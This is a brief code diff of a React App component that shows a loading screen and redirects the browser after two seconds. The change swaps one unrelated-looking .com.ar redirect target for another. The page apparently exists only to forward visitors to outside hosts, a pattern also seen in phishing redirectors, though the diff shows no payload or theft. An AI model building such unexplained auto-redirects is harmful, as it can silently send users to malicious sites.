@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://ss.materialesiluminacion.com.ar';
+            window.location.href = 'https://vc.noviolencia.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
